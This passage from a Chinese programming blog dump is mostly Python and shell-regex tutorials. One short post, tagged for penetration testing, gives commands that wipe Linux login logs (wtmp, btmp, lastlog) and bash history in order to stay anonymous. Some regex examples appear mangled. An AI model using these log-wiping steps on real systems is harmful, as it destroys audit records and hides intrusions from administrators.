next(r)9&gt;&gt;&gt; next(r) --&gt; 显示;16 reduce ((((1+2)+3)+4)+5) reduce把一个函数作用在一个序列[x1, x2, x3, ...]上，这个函数必须接收两个参数，reduce把结果继续和序列的下一个元素做累积计算，其效果就是： 1reduce(f, [x1, x2, x3, x4]) = f(f(f(x1, x2), x3), x4) // --&gt; 计算1 2 将1 2 作为 ARG1 再次输入 比方说对一个序列求和，就可以用reduce实现： 123456&gt;&gt;&gt; from functools import reduce&gt;&gt;&gt; def add(x, y):... return x + y...&gt;&gt;&gt; reduce(add, [1, 3, 5, 7, 9])25 此求和运算 可以直接用Python内建函数sum()，没必要动用reduce。 1reduce(lambda x, y: x+y, [1, 2, 3, 4, 5]) calculates ((((1+2)+3)+4)+5). filter 过滤序列filter()把传入的函数依次作用于每个元素，然后根据返回值是True还是False决定保留还是丢弃该元素。 例如，在一个list中，删掉偶数，只保留奇数，可以这么写： 12345def is_odd(n): return n % 2 == 1list(filter(is_odd, [1, 2, 4, 5, 6, 9, 10, 15]))# 结果: [1, 5, 9, 15] 把一个序列中的空字符串删掉，可以这么写： 12345def not_empty(s): return s and s.strip()list(filter(not_empty, [&apos;A&apos;, &apos;&apos;, &apos;B&apos;, None, &apos;C&apos;, &apos; &apos;]))# 结果: [&apos;A&apos;, &apos;B&apos;, &apos;C&apos;] 可见用filter()这个高阶函数，关键在于正确实现一个“筛选”函数。 注意到filter()函数返回的是一个Iterator，也就是一个惰性序列，所以要强迫filter()完成计算结果，需要用list()函数获得所有结果并返回list。 排序算法 sortedPython内置的sorted()函数就可以对list进行排序： 12&gt;&gt;&gt; sorted([36, 5, -12, 9, -21])[-21, -12, 5, 9, 36] 此外，sorted()函数也是一个高阶函数，它还可以接收一个key函数来实现自定义的排序，例如按绝对值大小排序： 12&gt;&gt;&gt; sorted([36, 5, -12, 9, -21], key=abs)[5, 9, -12, -21, 36] key指定的函数将作用于list的每一个元素上，并根据key函数返回的结果进行排序。 我们再看一个字符串排序的例子： 12&gt;&gt;&gt; sorted([&apos;bob&apos;, &apos;about&apos;, &apos;Zoo&apos;, &apos;Credit&apos;])[&apos;Credit&apos;, &apos;Zoo&apos;, &apos;about&apos;, &apos;bob&apos;] 默认情况下，对字符串排序，是按照ASCII的大小比较的，由于&#39;Z&#39; &lt; &#39;a&#39;，结果，大写字母Z会排在小写字母a的前面。 现在，我们提出排序应该忽略大小写，按照字母序排序。要实现这个算法，不必对现有代码大加改动，只要我们能用一个key函数把字符串映射为忽略大小写排序即可。忽略大小写来比较两个字符串，实际上就是先把字符串都变成大写（或者都变成小写），再比较。 这样，我们给sorted传入key函数，即可实现忽略大小写的排序： 12&gt;&gt;&gt; sorted([&apos;bob&apos;, &apos;about&apos;, &apos;Zoo&apos;, &apos;Credit&apos;], key=str.lower)[&apos;about&apos;, &apos;bob&apos;, &apos;Credit&apos;, &apos;Zoo&apos;] 要进行反向排序，不必改动key函数，可以传入第三个参数reverse=True： 12&gt;&gt;&gt; sorted([&apos;bob&apos;, &apos;about&apos;, &apos;Zoo&apos;, &apos;Credit&apos;], key=str.lower, reverse=True)[&apos;Zoo&apos;, &apos;Credit&apos;, &apos;bob&apos;, &apos;about&apos;] 从上述例子可以看出，高阶函数的抽象能力是非常强大的，而且，核心代码可以保持得非常简洁。 总结 sorted()也是一个高阶函数。用sorted()排序的关键在于实现一个映射函数。 匿名函数 lambda12&gt;&gt;&gt; list(map(lambda x: x * x, [1, 2, 3, 4, 5, 6, 7, 8, 9]))[1, 4, 9, 16, 25, 36, 49, 64, 81] 通过对比可以看出，匿名函数lambda x: x * x实际上就是： 12def f(x): return x * x 关键字lambda 表示匿名函数，冒号前面的x表示函数参数。 匿名函数有限制: 就是只能有一个表达式,不用写return, 返回值就是该表达式的结果。 匿名函数有个好处，因为函数没有名字， 所以不必担心函数起冲突， 此外，匿名函数也是一个函数对象， 也可以将匿名函数赋值给一个变量， 在利用变量调用该函数 12345&gt;&gt;&gt; f = lambda x: x * x&gt;&gt;&gt; f&lt;function &lt;lambda&gt; at 0x101c6ef28&gt;&gt;&gt;&gt; f(5)25 装饰器 @log由于函数也是一个对象，而且函数对象可以被赋值给变量，所以，通过变量也能调用该函数。 123456&gt;&gt;&gt; def now():... print(&apos;2015-3-25&apos;)...&gt;&gt;&gt; f = now&gt;&gt;&gt; f()2015-3-25 函数对象有一个__name__属性，可以拿到函数的名字： 1234&gt;&gt;&gt; now.__name__&apos;now&apos;&gt;&gt;&gt; f.__name__&apos;now&apos; 现在，假设我们要增强now()函数的功能，比如，在函数调用前后自动打印日志，但又不希望修改now()函数的定义，这种在代码运行期间动态增加功能的方式，称之为“装饰器”（Decorator）。 本质上，decorator就是一个返回函数的高阶函数。所以，我们要定义一个能打印日志的decorator，可以定义如下： 12345def log(func): def wrapper(*args, **kw): print(&apos;call %s():&apos; % func.__name__) return func(*args, **kw) ## 传递func 发生调用函数 return wrapper ## 调用warpper, 是指生效。 观察上面的log，因为它是一个decorator，所以接受一个函数作为参数，并返回一个函数。我们要借助Python的@语法，把decorator置于函数的定义处： 123@logdef now(): print(&apos;2015-3-25&apos;) 调用now()函数，不仅会运行now()函数本身，还会在运行now()函数前打印一行日志： 123&gt;&gt;&gt; now()call now():2015-3-25 把@log放到now()函数的定义处，相当于执行了语句： 1now = log(now) 由于log()是一个decorator，返回一个函数，所以，原来的now()函数仍然存在，只是现在同名的now变量指向了新的函数，于是调用now()将执行新函数，即在log()函数中返回的wrapper()函数。 wrapper()函数的参数定义是(*args, **kw)，因此，wrapper()函数可以接受任意参数的调用。在wrapper()函数内，首先打印日志，再紧接着调用原始函数。 廖雪峰-装饰器","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Python/"}]},{"title":"清除Linux登陆信息以及Bash历史","slug":"kali/清除Linux登陆信息以及Bash历史","date":"2018-01-12T12:18:51.000Z","updated":"2018-11-19T16:06:35.616Z","comments":true,"path":"2018/01/12/kali/清除Linux登陆信息以及Bash历史/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/01/12/kali/清除Linux登陆信息以及Bash历史/","excerpt":"用户登陆信息 last lastb lastlog history","text":"用户登陆信息 last lastb lastlog history 清除登陆信息Linux 系统有三个标准的显示用户最近登陆信息的命令: last, lastb, lastlog 这些命令的输出信息包括登录用户名，最近登陆时间，IP地址等。 为了更好的保持匿名，可以清除信息 123last 命令 对应日志文件 /var/log/wtmp: 成功登陆用户lastb 命令 对应日志文件 /var/log/btmp: 尝试登陆用户lastlog 命令 对应日志文件 /var/log/lastlog: 最近登陆信息 清空日志文件: 123echo &gt; /var/log/wtmpecho &gt; /var/log/btmpecho &gt; /var/log/lastlog 清除Bash历史可以在执行命令时，指定Bash不保存命令: 1$ &lt;空格&gt; command 在要执行的命令前加一个空格。 清除当前登录session的历史: 1$ history -r 清除所有历史: 1$ history -cw","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"渗透","slug":"渗透","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/渗透/"},{"name":"Kali","slug":"Kali","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Kali/"}]},{"title":"Python-控制语句及函数","slug":"gram/Python-控制语句","date":"2018-01-10T12:37:37.000Z","updated":"2018-11-19T16:12:45.629Z","comments":false,"path":"2018/01/10/gram/Python-控制语句/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/01/10/gram/Python-控制语句/","excerpt":"if-elif-else for while 函数 函数定义 空函数 pass 返回多个值 可变参数 * 关键字参数 **","text":"if-elif-else for while 函数 函数定义 空函数 pass 返回多个值 可变参数 * 关键字参数 ** 控制语句if - elif - else比如，输入用户年龄，根据年龄打印不同的内容，在Python程序中，用if语句实现： 1234age = 20if age &gt;= 18: print(&apos;your age is&apos;, age) print(&apos;adult&apos;) 根据Python的缩进规则，如果if语句判断是True，就把缩进的两行print语句执行了，否则，什么也不做。 也可以给if添加一个else语句，意思是，如果if判断是False，不要执行if的内容，去把else执行了： 1234567age = 3if age &gt;= 18: print(&apos;your age is&apos;, age) print(&apos;adult&apos;)else: print(&apos;your age is&apos;, age) print(&apos;teenager&apos;) 注意不要少写了冒号:。 当然上面的判断是很粗略的，完全可以用elif做更细致的判断： 1234567age = 3if age &gt;= 18: print(&apos;adult&apos;)elif age &gt;= 6: print(&apos;teenager&apos;)else: print(&apos;kid&apos;) elif是else if的缩写，完全可以有多个elif，所以if语句的完整形式就是： 12345678if &lt;条件判断1&gt;: &lt;执行1&gt;elif &lt;条件判断2&gt;: &lt;执行2&gt;elif &lt;条件判断3&gt;: &lt;执行3&gt;else: &lt;执行4&gt; if语句执行有个特点，它是从上往下判断，如果在某个判断上是True，把该判断对应的语句执行后，就忽略掉剩下的elif和else，所以，请测试并解释为什么下面的程序打印的是teenager： 1234567age = 20if age &gt;= 6: print(&apos;teenager&apos;)elif age &gt;= 18: print(&apos;adult&apos;)else: print(&apos;kid&apos;) if判断条件还可以简写，比如写： 12if x: print(&apos;True&apos;) 只要x是非零数值、非空字符串、非空list等，就判断为True，否则为False。 循环Python的循环有两种，一种是for…in循环，依次把list或tuple中的每个元素迭代出来， 看例子： 123names = [&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;]for name in names: print(name) 执行这段代码，会依次打印names的每一个元素： 123MichaelBobTracy 所以for x in ...循环就是把每个元素代入变量x，然后执行缩进块的语句。 第二种循环是while循环，只要条件满足，就不断循环，条件不满足时退出循环。 比如我们要计算100以内所有奇数之和，可以用while循环实现： 123456sum = 0n = 99while n &gt; 0: sum = sum + n n = n - 2print(sum) 在循环内部变量n不断自减，直到变为-1时，不再满足while条件，循环退出。 函数函数定义在Python中，定义一个函数要使用def语句，依次写出函数名、括号、括号中的参数和冒号:，然后，在缩进块中编写函数体，函数的返回值用return语句返回。 空函数 pass如果想定义一个什么事也不做的空函数，可以用pass语句： 12def nop(): pass pass语句什么都不做，那有什么用？实际上pass可以用来作为占位符，比如现在还没想好怎么写函数的代码，就可以先放一个pass，让代码能运行起来。 pass还可以用在其他语句里，比如： 12if age &gt;= 18: pass 缺少了pass，代码运行就会有语法错误。 返回多个值函数可以返回多个值吗？答案是肯定的。 比如在游戏中经常需要从一个点移动到另一个点，给出坐标、位移和角度，就可以计算出新的新的坐标： 12345678910import mathdef move(x, y, step, angle=0): nx = x + step * math.cos(angle) ny = y - step * math.sin(angle) return nx, ny &gt;&gt;&gt; x, y = move(100, 100, 60, math.pi / 6)&gt;&gt;&gt; print(x, y)151.96152422706632 70.0 但其实这只是一种假象，Python函数返回的仍然是单一值： 123&gt;&gt;&gt; r = move(100, 100, 60, math.pi / 6)&gt;&gt;&gt; print(r)(151.96152422706632, 70.0) 原来返回值是一个tuple！但是，在语法上，返回一个tuple可以省略括号，而多个变量可以同时接收一个tuple，按位置赋给对应的值，所以，Python的函数返回多值其实就是返回一个tuple，但写起来更方便。 默认参数123456def power(x, n=2): s = 1 while n &gt; 0: n = n - 1 s = s * x return s 则，我们调用power(5), 相当于调用 power(5, 2)。 1234&gt;&gt;&gt; power(5)25&gt;&gt;&gt; power(5, 2)25 设置默认参数时，有几点要注意： 一是必选参数在前，默认参数在后，否则Python的解释器会报错（思考一下为什么默认参数不能放在必选参数前面） 二是如何设置默认参数。 当函数有多个参数时，把变化大的参数放前面，变化小的参数放后面。变化小的参数就可以作为默认参数。 ​ 可变参数 *要定义出这个函数，我们必须确定输入的参数。由于参数个数不确定，我们首先想到可以把a，b，c……作为一个list或tuple传进来，这样，函数可以定义如下： 12345def calc(numbers): sum = 0 for n in numbers: sum = sum + n * n return sum 但是调用的时候，需要先组装出一个list或tuple： 1234&gt;&gt;&gt; calc([1, 2, 3])14&gt;&gt;&gt; calc((1, 3, 5, 7))84 如果利用可变参数，调用函数的方式可以简化成这样： 1234&gt;&gt;&gt; calc(1, 2, 3)14&gt;&gt;&gt; calc(1, 3, 5, 7) // 区别少了 [] ()84 所以，我们把函数的参数改为可变参数： 12345def calc(*numbers): // 函数定义修改为 *numbers sum = 0 for n in numbers: sum = sum + n * n return sum 定义可变参数和定义一个list或tuple参数相比，仅仅在参数前面加了一个*号。在函数内部，参数numbers接收到的是一个tuple，因此，函数代码完全不变。但是，调用该函数时，可以传入任意个参数，包括0个参数： 1234&gt;&gt;&gt; calc(1, 2)5&gt;&gt;&gt; calc()0 如果已经有一个list或者tuple，要调用一个可变参数怎么办？可以这样做： 123&gt;&gt;&gt; nums = [1, 2, 3]&gt;&gt;&gt; calc(nums[0], nums[1], nums[2])14 这种写法当然是可行的，问题是太繁琐，所以Python允许你在list或tuple前面加一个*号，把list或tuple的元素变成可变参数传进去： 123&gt;&gt;&gt; nums = [1, 2, 3]&gt;&gt;&gt; calc(*nums)14 *nums表示把nums这个list的所有元素作为可变参数传进去。这种写法相当有用，而且很常见。 关键字参数 **可变参数允许你传入0个或任意个参数，这些可变参数在函数调用时自动组装为一个tuple。而关键字参数允许你传入0个或任意个含参数名的参数，这些关键字参数在函数内部自动组装为一个dict。请看示例： 12def person(name, age, **kw): print(&apos;name:&apos;, name, &apos;age:&apos;, age, &apos;other:&apos;, kw) 函数person除了必选参数name和age外，还接受关键字参数kw。在调用该函数时，可以只传入必选参数： 12&gt;&gt;&gt; person(&apos;Michael&apos;, 30)name: Michael age: 30 other: &#123;&#125; 也可以传入任意个数的关键字参数： 1234&gt;&gt;&gt; person(&apos;Bob&apos;, 35, city=&apos;Beijing&apos;)name: Bob age: 35 other: &#123;&apos;city&apos;: &apos;Beijing&apos;&#125;&gt;&gt;&gt; person(&apos;Adam&apos;, 45, gender=&apos;M&apos;, job=&apos;Engineer&apos;)name: Adam age: 45 other: &#123;&apos;gender&apos;: &apos;M&apos;, &apos;job&apos;: &apos;Engineer&apos;&#125; 应用: 12345678910111213141516def test(name, age, **kw): print(&quot;name : &quot; , name, &quot; age = &quot;, age ,&quot; other &quot;, kw) for k in kw: #print(k, &quot; = &quot;, kw[k]) if k == &apos;addr&apos;: print(&quot;addr = &quot;, kw[k]) elif k == &apos;phone&apos;: print(&quot;phone = &quot;, kw[k])if __name__ == &apos;__main__&apos;: test(&apos;lg&apos;, 12, addr=&apos;jn&apos;, phone=&apos;110&apos;)&gt;&gt;phone = 110&gt;&gt;addr = jn 或者: 12345678def person(name, age, **kw): if &apos;city&apos; in kw: # 有city参数 pass if &apos;job&apos; in kw: # 有job参数 pass print(&apos;name:&apos;, name, &apos;age:&apos;, age, &apos;other:&apos;, kw)","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Python/"}]},{"title":"Pyhton-数据类型","slug":"gram/Pyhton-数据类型","date":"2018-01-09T12:31:43.000Z","updated":"2018-11-19T16:12:32.629Z","comments":true,"path":"2018/01/09/gram/Pyhton-数据类型/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/01/09/gram/Pyhton-数据类型/","excerpt":"数据类型 字符串 列表 元组 字典 dict set","text":"数据类型 字符串 列表 元组 字典 dict set 字符串input最后看一个有问题的条件判断。很多同学会用input()读取用户的输入，这样可以自己输入，程序运行得更有意思： 12345birth = input(&apos;birth: &apos;)if birth &lt; 2000: print(&apos;00前&apos;)else: print(&apos;00后&apos;) 输入1982，结果报错： 123Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;TypeError: unorderable types: str() &gt; int() 这是因为input()返回的数据类型是str，str不能直接和整数比较，必须先把str转换成整数。Python提供了int()函数来完成这件事情： 123456s = input(&apos;birth: &apos;)birth = int(s)if birth &lt; 2000: print(&apos;00前&apos;)else: print(&apos;00后&apos;) 再次运行，就可以得到正确地结果。但是，如果输入abc呢？又会得到一个错误信息： 123Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;ValueError: invalid literal for int() with base 10: &apos;abc&apos; 原来int()函数发现一个字符串并不是合法的数字时就会报错，程序就退出了。 因此需要捕捉异常处理。 Unicode 与 ASCIIPython提供了ord()函数获取字符的整数表示，chr()函数把编码转换为对应的字符： 12345678&gt;&gt;&gt; ord(&apos;A&apos;)65&gt;&gt;&gt; ord(&apos;中&apos;)20013&gt;&gt;&gt; chr(20013)&apos;中&apos;&gt;&gt;&gt; chr(65)&apos;A&apos; 由于Python的字符串类型是str，在内存中以Unicode表示，一个字符对应若干个字节。如果要在网络上传输，或者保存到磁盘上，就需要把str变为以字节为单位的bytes。 Python对bytes类型的数据用带b前缀的单引号或双引号表示： 1x = b&apos;ABC&apos; 要注意区分&#39;ABC&#39;和b&#39;ABC&#39;，前者是str，后者虽然内容显示得和前者一样，但bytes的每个字符都只占用一个字节。 转换 byte &lt;-&gt; str以Unicode表示的str通过encode()方法可以编码为指定的bytes，例如： 12345678&gt;&gt;&gt; &apos;ABC&apos;.encode(&apos;ascii&apos;)b&apos;ABC&apos;&gt;&gt;&gt; &apos;中文&apos;.encode(&apos;utf-8&apos;)b&apos;\\xe4\\xb8\\xad\\xe6\\x96\\x87&apos;&gt;&gt;&gt; &apos;中文&apos;.encode(&apos;ascii&apos;)Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;UnicodeEncodeError: &apos;ascii&apos; codec can&apos;t encode characters in position 0-1: ordinal not in range(128) 纯英文的str可以用ASCII编码为bytes，内容是一样的，含有中文的str可以用UTF-8编码为bytes。含有中文的str无法用ASCII编码，因为中文编码的范围超过了ASCII编码的范围，Python会报错。 反过来，如果我们从网络或磁盘上读取了字节流，那么读到的数据就是bytes。要把bytes变为str，就需要用decode()方法： 1234&gt;&gt;&gt; b&apos;ABC&apos;.decode(&apos;ascii&apos;)&apos;ABC&apos;&gt;&gt;&gt; b&apos;\\xe4\\xb8\\xad\\xe6\\x96\\x87&apos;.decode(&apos;utf-8&apos;)&apos;中文&apos; 如果bytes中包含无法解码的字节，decode()方法会报错： 1234&gt;&gt;&gt; b&apos;\\xe4\\xb8\\xad\\xff&apos;.decode(&apos;utf-8&apos;)Traceback (most recent call last): ...UnicodeDecodeError: &apos;utf-8&apos; codec can&apos;t decode byte 0xff in position 3: invalid start byte 如果bytes中只有一小部分无效的字节，可以传入errors=&#39;ignore&#39;忽略错误的字节： 12&gt;&gt;&gt; b&apos;\\xe4\\xb8\\xad\\xff&apos;.decode(&apos;utf-8&apos;, errors=&apos;ignore&apos;)&apos;中&apos; 格式化字符串常见的占位符有： 占位符 替换内容 %d 整数 %f 浮点数 %s 字符串 %x 十六进制整数 在Python中，采用的格式化方式和C语言是一致的，用%实现，举例如下： 1234&gt;&gt;&gt; &apos;Hello, %s&apos; % &apos;world&apos;&apos;Hello, world&apos;&gt;&gt;&gt; &apos;Hi, %s, you have $%d.&apos; % (&apos;Michael&apos;, 1000000)&apos;Hi, Michael, you have $1000000.&apos; format() 另一种格式化字符串的方法是使用字符串的format()方法，它会用传入的参数依次替换字符串内的占位符{0}、{1}……，不过这种方式写起来比%要麻烦得多： 12&gt;&gt;&gt; &apos;Hello, &#123;0&#125;, 成绩提升了 &#123;1:.1f&#125;%&apos;.format(&apos;小明&apos;, 17.125)&apos;Hello, 小明, 成绩提升了 17.1%&apos; ​ list 列表 []123&gt;&gt;&gt; classmates = [&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;]&gt;&gt;&gt; classmates[&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;] list是一个可变的有序表，所以，可以往list中追加元素到末尾： 123&gt;&gt;&gt; classmates.append(&apos;Adam&apos;)&gt;&gt;&gt; classmates[&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;, &apos;Adam&apos;] 也可以把元素插入到指定的位置，比如索引号为1的位置： 123&gt;&gt;&gt; classmates.insert(1, &apos;Jack&apos;)&gt;&gt;&gt; classmates[&apos;Michael&apos;, &apos;Jack&apos;, &apos;Bob&apos;, &apos;Tracy&apos;, &apos;Adam&apos;] 要删除list末尾的元素，用pop()方法： 1234&gt;&gt;&gt; classmates.pop()&apos;Adam&apos;&gt;&gt;&gt; classmates[&apos;Michael&apos;, &apos;Jack&apos;, &apos;Bob&apos;, &apos;Tracy&apos;] 要删除指定位置的元素，用pop(i)方法，其中i是索引位置： 1234&gt;&gt;&gt; classmates.pop(1)&apos;Jack&apos;&gt;&gt;&gt; classmates[&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;] 要把某个元素替换成别的元素，可以直接赋值给对应的索引位置： 123&gt;&gt;&gt; classmates[1] = &apos;Sarah&apos;&gt;&gt;&gt; classmates[&apos;Michael&apos;, &apos;Sarah&apos;, &apos;Tracy&apos;] list里面的元素的数据类型也可以不同，比如： 1&gt;&gt;&gt; L = [&apos;Apple&apos;, 123, True] list元素也可以是另一个list，比如： 123&gt;&gt;&gt; s = [&apos;python&apos;, &apos;java&apos;, [&apos;asp&apos;, &apos;php&apos;], &apos;scheme&apos;]&gt;&gt;&gt; len(s)4 要注意s只有4个元素，其中s[2]又是一个list，如果拆开写就更容易理解了： 12&gt;&gt;&gt; p = [&apos;asp&apos;, &apos;php&apos;]&gt;&gt;&gt; s = [&apos;python&apos;, &apos;java&apos;, p, &apos;scheme&apos;] 要拿到&#39;php&#39;可以写p[1]或者s[2][1]，因此s可以看成是一个二维数组，类似的还有三维、四维……数组，不过很少用到。 如果一个list中一个元素也没有，就是一个空的list，它的长度为0： 123&gt;&gt;&gt; L = []&gt;&gt;&gt; len(L)0 tuple 元组 ()另一种有序列表叫元组：tuple。tuple和list非常类似，但是tuple一旦初始化就不能修改，比如同样是列出同学的名字： 1&gt;&gt;&gt; classmates = (&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;) dict 字典 {}Python内置了字典：dict的支持，dict全称dictionary，在其他语言中也称为map，使用键-值（key-value）存储，具有极快的查找速度。 123&gt;&gt;&gt; d = &#123;&apos;Michael&apos;: 95, &apos;Bob&apos;: 75, &apos;Tracy&apos;: 85&#125;&gt;&gt;&gt; d[&apos;Michael&apos;]95 为什么dict查找速度这么快？因为dict的实现原理和查字典是一样的。假设字典包含了1万个汉字，我们要查某一个字，一个办法是把字典从第一页往后翻，直到找到我们想要的字为止，这种方法就是在list中查找元素的方法，list越大，查找越慢。 第二种方法是先在字典的索引表里（比如部首表）查这个字对应的页码，然后直接翻到该页，找到这个字。无论找哪个字，这种查找速度都非常快，不会随着字典大小的增加而变慢。 这就是 dict采用的方式。 把数据放入dict的方法，除了初始化时指定外，还可以通过key放入： 123&gt;&gt;&gt; d[&apos;Adam&apos;] = 67&gt;&gt;&gt; d[&apos;Adam&apos;]67 由于一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉： 123456&gt;&gt;&gt; d[&apos;Jack&apos;] = 90&gt;&gt;&gt; d[&apos;Jack&apos;]90&gt;&gt;&gt; d[&apos;Jack&apos;] = 88&gt;&gt;&gt; d[&apos;Jack&apos;]88 如果key不存在，dict就会报错： 1234&gt;&gt;&gt; d[&apos;Thomas&apos;]Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;KeyError: &apos;Thomas&apos; 要避免key不存在的错误，有两种办法，一是通过in判断key是否存在： 12&gt;&gt;&gt; &apos;Thomas&apos; in dFalse 二是通过dict提供的get()方法，如果key不存在，可以返回None，或者自己指定的value： 123&gt;&gt;&gt; d.get(&apos;Thomas&apos;)&gt;&gt;&gt; d.get(&apos;Thomas&apos;, -1)-1 注意：返回None的时候Python的交互环境不显示结果。 要删除一个key，用pop(key)方法，对应的value也会从dict中删除： 1234&gt;&gt;&gt; d.pop(&apos;Bob&apos;)75&gt;&gt;&gt; d&#123;&apos;Michael&apos;: 95, &apos;Tracy&apos;: 85&#125; 请务必注意，dict内部存放的顺序和key放入的顺序是没有关系的 dict 与 list 区别:和list比较，dict有以下几个特点： 查找和插入的速度极快，不会随着key的增加而变慢； 需要占用大量的内存，内存浪费多。 而list相反： 查找和插入的时间随着元素的增加而增加； 占用空间小，浪费内存很少。 所以，dict是用空间来换取时间的一种方法。 set 字典set和dict类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在set中，没有重复的key。 要创建一个set，需要提供一个list作为输入集合： 123&gt;&gt;&gt; s = set([1, 2, 3])&gt;&gt;&gt; s&#123;1, 2, 3&#125; 注意，传入的参数[1, 2, 3]是一个list，而显示的{1, 2, 3}只是告诉你这个set内部有1，2，3这3个元素，显示的顺序也不表示set是有序的。。 重复元素在set中自动被过滤： 123&gt;&gt;&gt; s = set([1, 1, 2, 2, 3, 3])&gt;&gt;&gt; s&#123;1, 2, 3&#125; 通过add(key)方法可以添加元素到set中，可以重复添加，但不会有效果： 123456&gt;&gt;&gt; s.add(4)&gt;&gt;&gt; s&#123;1, 2, 3, 4&#125;&gt;&gt;&gt; s.add(4)&gt;&gt;&gt; s&#123;1, 2, 3, 4&#125; 通过remove(key)方法可以删除元素： 123&gt;&gt;&gt; s.remove(4)&gt;&gt;&gt; s&#123;1, 2, 3&#125; set可以看成数学意义上的无序和无重复元素的集合，因此，两个set可以做数学意义上的交集、并集等操作： 123456&gt;&gt;&gt; s1 = set([1, 2, 3])&gt;&gt;&gt; s2 = set([2, 3, 4])&gt;&gt;&gt; s1 &amp; s2&#123;2, 3&#125;&gt;&gt;&gt; s1 | s2&#123;1, 2, 3, 4&#125; set和dict的唯一区别仅在于没有存储对应的value，但是，set的原理和dict一样，所以，同样不可以放入可变对象，因为无法判断两个可变对象是否相等，也就无法保证set内部“不会有重复元素”。试试把list放入set，看看是否会报错。","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Python/"}]},{"title":"正则表达式","slug":"gram/shell-正则表达式","date":"2018-01-01T09:14:14.000Z","updated":"2018-11-19T16:12:11.764Z","comments":false,"path":"2018/01/01/gram/shell-正则表达式/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/01/01/gram/shell-正则表达式/","excerpt":"正则表达式正则表达式是你所定义的模式模板, Linux工具(sed 和 gawk ) 能够在处理数据时使用正则表达式对数据进行模式匹配， 匹配成功, 接受下一步处理 否则 被过滤掉。","text":"正则表达式正则表达式是你所定义的模式模板, Linux工具(sed 和 gawk ) 能够在处理数据时使用正则表达式对数据进行模式匹配， 匹配成功, 接受下一步处理 否则 被过滤掉。 正则表达式类型:使用正则表达式最大的问题在于不止一种类型的正则表达式, 不同的应用程序可能会用不同类型的正则表达式. 正则表达式是通过正则表达式引擎实现的[ 一套底层软件, 负责解释正则表达式模式并使用这些模式进行文本匹配 ] Linux 两种流行正则表达式引擎: POSIX 基础正则表达式引擎(basic regular expression, BRE) POSIX 扩展正则表达式引擎(extended regular expression, ERE) 大多数Linux工具都至少符合POSIX BRE引擎规范, 能够识别该规范定义的所有模式符号. sed 编辑器基本符合BRE引擎 gawk编辑器符合ERE引擎 定义BRE模式脱字符(^) : 定义从数据流中文本行的行首开始的模式 美元符($) : 定义行尾锚点 点号字符(.): 用来匹配换行符之外的任意单个字符 字符组: 用来匹配文本模式中某个位置的一组字符1sed -n &apos;/[ch]at/p&apos; filename ## 匹配cat or hat 排除型字符组用来排除字符组中的字符, 用来寻找字符组中不存在字符: [^] 表示 1234567$cat name.sh hatfatcat$sed -n &apos;/chat/p&apos; filenamefat 特殊字符区间: 用单破折号在字符组中表示字符区间.1234567891011121314$cat number12354asdff5345365335$sed -n &apos;/0-90-9[0-9]/p&apos; number1235453453sed -n &apos;/^[0-9][0-9][0-9][0-9][0-9]/p&apos; number ##行首 到 行尾1235453453 多个不连续区间 123456$ echo 1 | sed -n &apos;/[0-26-9]/p&apos;1$ echo 5 | sed -n &apos;/[0-26-9]/p&apos;$ echo 1 | sed -n &apos;/[0-26-9]/p&apos;1$ echo 5 | sed -n &apos;/[0-26-9]/p&apos; 特殊字符组 字符组 描述 [[:alpha:]] 匹配任意字母字符,不管大写还是小写 [[:alnum:]] 匹配任意字母数字字符0-9, A-Z a-z [[:digit:]] 匹配0-9之间的数字 [0-9] [[:lower:]] 匹配小写字母字符 a-z [[:upper:]] 匹配任意大写字母字符 A-Z [[:blank:]] 匹配空格或制表符 [[:punct:]] 匹配任意点符号 [[:space:]] 匹配任意空白字符: 空格, 制表符, NL, FF, VT, CR [[:print:]] 匹配任意可打印字符 星号: 放置于字符后面,表明该字符必须在匹配模式出现0次或者多次12345sed -n &apos;/^she*t/p&apos; stringsheetsed -n &apos;/^sh[ea]*t/p&apos; stringsheetshaat 定义ERE模式 星号 (*): 表明前面的字符出现0次或者多次 问号 (?) : 表明前面的字符只出现0次或者1次 加号 (+): 表明前面的字符至少出现1次 花括号{}: 允许我可重复的正则表达式指定一个上限. 称为间隔 m : 正则表达式准确出现 m 次 m, n : 正则表达式至少出现m次, 最多n次 默认情况下: gawk不会识别ERE的间隔, 需要指定 --re-interval 管道符号 管道符号允许你在检查数据流时,用逻辑OR方式指定正则表达式引擎要用两个或多个模式123456789$cat name.shhello,worldhatfatcat$ gawk &apos;/cat|fat/&#123;print $0&#125;&apos; name.sh fatcat 表达式分组 正则表达式模式也可以用圆括号分组, 该组会被视为一个标准字符 1echo &quot;cat&quot; | gawk &apos;/(c|b)a(a|t)/&#123;print $0&#125;&apos; ​ 练习: 解析匹配电话号码 12345678910111213141516171819202122232425262728293031323334353637383940匹配电话号码:(123)456-7890(123) 456-7890123-456-7890123.456.7890从左侧开始看:1. 出现 ( 或者直接是区号 ^\\(? ## 0 或者 12. 区号, 第一个数字是1-9 不可能是0, 共三个数字 [1-9][0-9]&#123;2&#125; \\)?3. 